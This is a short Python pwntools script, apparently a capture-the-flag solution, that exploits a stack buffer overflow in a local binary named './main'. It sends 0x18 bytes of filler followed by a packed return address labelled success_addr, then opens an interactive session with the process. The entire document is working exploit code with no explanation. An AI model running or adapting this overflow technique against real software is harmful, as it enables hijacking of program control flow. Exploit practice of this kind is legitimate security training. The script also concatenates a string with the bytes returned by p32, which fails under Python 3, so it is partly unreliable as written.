##coding=utf8 
from pwn import * 
sh = process('./main') 
success_addr = 0x080491b6 
payload = '0' * 0x18 + p32(success_addr) 
sh.sendline(payload) 
sh.interactive() 
